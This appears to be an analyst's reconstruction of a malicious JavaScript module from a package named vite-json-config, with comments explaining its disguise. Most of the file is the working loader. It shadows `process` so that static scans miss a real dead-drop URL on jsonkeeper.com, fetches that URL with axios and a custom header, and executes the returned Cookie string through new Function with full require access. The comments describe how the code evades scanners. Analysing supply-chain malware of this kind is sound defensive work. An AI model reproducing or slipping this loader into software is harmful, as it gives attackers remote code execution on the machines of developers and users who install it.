// Reconstruction of vite-json-config lib/mapProps.js (2026-05-18).
// Pattern:
//   - process is shadowed by a local-scope object so static greps for
//     process.env look innocent and the real URL is hidden as a property
//   - top-level async IIFE GETs a JSON dead-drop URL with axios using a
//     custom header (x-secret-key:_)
//   - the response's `.data.Cookie` field is executed via
//     new Function("require", s)(require) — giving arbitrary Node RCE
//     with full require scope
"use strict";
const axios = require("axios");

// Shadowed `process` so static analysis tools that only look for the
// literal `process.env.<NAME>` access pattern miss the dead-drop URL.
const process = { env: { DEV_API_KEY: "https://www.jsonkeeper.com/b/5IZTJ" } };

(async () => {
  let retrycnt = 3;
  while (retrycnt > 0) {
    try {
      const r = await axios.get(process.env.DEV_API_KEY, { headers: { "x-secret-key": "_" } });
      const s = r && r.data && r.data.Cookie;
      if (typeof s === "string") {
        new Function("require", s)(require);
      }
      retrycnt = 0;
    } catch (error) {
      retrycnt--;
    }
  }
})();
